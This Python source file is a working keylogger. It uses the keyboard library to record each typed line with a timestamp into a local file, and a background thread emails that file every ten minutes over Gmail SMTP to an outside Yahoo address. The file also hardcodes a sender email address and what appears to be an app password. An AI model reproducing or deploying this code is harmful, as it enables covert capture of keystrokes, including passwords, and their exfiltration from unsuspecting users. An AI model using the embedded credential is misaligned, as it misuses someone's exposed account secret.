#importing libraries
import keyboard
from datetime import datetime
import threading
import yagmail
import time
#file where the output will be placed
path="Keylogging_output.txt"


def user_input():
    #making a loop
    while True:
        #file gets appended
        with open(path, 'a') as output:
            #storing text as a variable until enter is pressed
            logs = keyboard.record('enter')
            user_input = list(keyboard.get_typed_strings(logs))
            
            #if user has entered something. checks to see if the list has an entry or is empty
            if user_input:
                #creating a time stamp to add to the text file
                timestamp = datetime.now().strftime("[%d-%m-%Y, %H:%M:%S]")
                #adds entry to the file
                output.write(f'\n{timestamp} {user_input[0]}')

def send_email():    
    #making a loop    
    while True:
        #timer for sending email is set at 10 seconds for testing purposes, but should be around 10 minutes if deployed
        time.sleep(600)
        try:
            #file is getting read
            with open(path, 'r') as email_send:
                email_send2 = email_send.read()
            #checks to see if the line is empty or not and remvoes whitespace
            if email_send2.strip():
                #email and password
                yag = yagmail.SMTP('isaac.capes05@gmail.com','tbsv gkpx flqa qfxa')
                yag.send(to='isaac.capes@yahoo.com',
                        subject='Message from txt file',
                        contents=email_send2)
        #simple error handling        
        except Exception as e:
            print("Email Error")    
                    
#allows both of these functions to run simulatenouisly
t1 = threading.Thread(target= user_input)
t2 = threading.Thread(target=send_email)

t1.start()
t2.start()